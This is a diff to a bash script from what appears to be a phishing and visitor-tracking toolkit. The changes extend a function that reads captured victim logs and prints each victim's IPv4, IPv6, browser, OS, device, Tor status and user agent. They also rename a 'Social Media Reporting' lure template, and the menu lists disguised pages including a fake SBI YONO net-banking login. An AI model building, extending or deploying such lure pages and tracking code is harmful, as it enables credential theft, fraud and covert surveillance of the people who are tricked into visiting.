@@ -252,11 +252,28 @@ exit 1
 catch_ip() {
   if [[ -e "data/ip_logs.txt" ]]; then
     last_entry=$(tail -n 1 "data/ip_logs.txt")
-    ipv4=$(echo "$last_entry" | grep -oP 'IPv4: \K[^ |]+')
-    ipv6=$(echo "$last_entry" | grep -oP 'IPv6: \K[^ |]+')
-    ua=$(echo "$last_entry" | grep -oP 'User-Agent: \K.*')
+    ipv4=$(echo "$last_entry" | grep -oP 'IPv4:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
+    ipv6=$(echo "$last_entry" | grep -oP 'IPv6:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
+    browser=$(echo "$last_entry" | grep -oP 'Browser:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
+    os=$(echo "$last_entry" | grep -oP 'OS:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
+    device=$(echo "$last_entry" | grep -oP 'Device:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
+    tor=$(echo "$last_entry" | grep -oP 'Tor:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
+    ua=$(echo "$last_entry" | grep -oP 'User-Agent:\s*\K.*' | sed 's/^[ \t]*//;s/[ \t]*$//')
+
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IPv4:\e[0m\e[1;77m %s\e[0m\n" "${ipv4:-Not detected}"
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IPv6:\e[0m\e[1;77m %s\e[0m\n" "${ipv6:-Not detected}"
+    if [[ -n "$browser" ]]; then
+      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Browser:\e[0m\e[1;77m %s\e[0m\n" "$browser"
+    fi
+    if [[ -n "$os" ]]; then
+      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] OS:\e[0m\e[1;77m %s\e[0m\n" "$os"
+    fi
+    if [[ -n "$device" ]]; then
+      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" "$device"
+    fi
+    if [[ "$tor" == "YES" ]]; then
+      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Tor Network:\e[0m\e[1;91m YES -- Anonymized Tor Exit Node\e[0m\n"
+    fi
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
     echo "$last_entry" >> data/saved_ip.txt
   else
@@ -782,7 +799,7 @@ build_payload() {
     sed 's+forwarding_link+'"$link_escaped"'+g' pages/LiveStreamYT.html > index3.html
     sed 's+live_yt_tv+'"$yt_video_ID"'+g' index3.html > index2.html
   elif [[ $option_tem -eq 4 ]]; then
-    # Template 4: Social Media Reporting Center --self-contained PHP portal
+    # Template 4: Social Media Reporting --self-contained PHP portal
     cp pages/SocialReportingPortal.html index2.html
   elif [[ $option_tem -eq 5 ]]; then
     # Template 5: Banking Portal -- SBI YONO Net Banking login page
@@ -1087,8 +1104,8 @@ printf "\n\e[1;95m----- Choose a template -----\e[0m\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Season’s Greetings\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YouTube Streaming\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Conference\e[0m\n"
-# Template 4 --Social Media Reporting Center (self-contained PHP module)
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Social Media Reporting Center\e[0m\n"
+# Template 4 --Social Media Reporting (self-contained PHP module)
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Social Media Reporting\e[0m\n"
 # Template 5 --Banking Portal (SBI YONO Net Banking)
 printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Banking Portal\e[0m\n"
   # Template 6 --Social Media (Snapchat, etc.)
@@ -1131,7 +1148,7 @@ done
 elif [[ $option_tem -eq 3 ]]; then
   : # Online Conference --no extra input required
 elif [[ $option_tem -eq 4 ]]; then
-  : # Social Media Reporting Center --self-contained, no extra input required
+  : # Social Media Reporting --self-contained, no extra input required
 elif [[ $option_tem -eq 5 ]]; then
   # Bank template --show bank sub-menu
   printf "\n\e[1;95m----- Choose a Bank -----\e[0m\n"
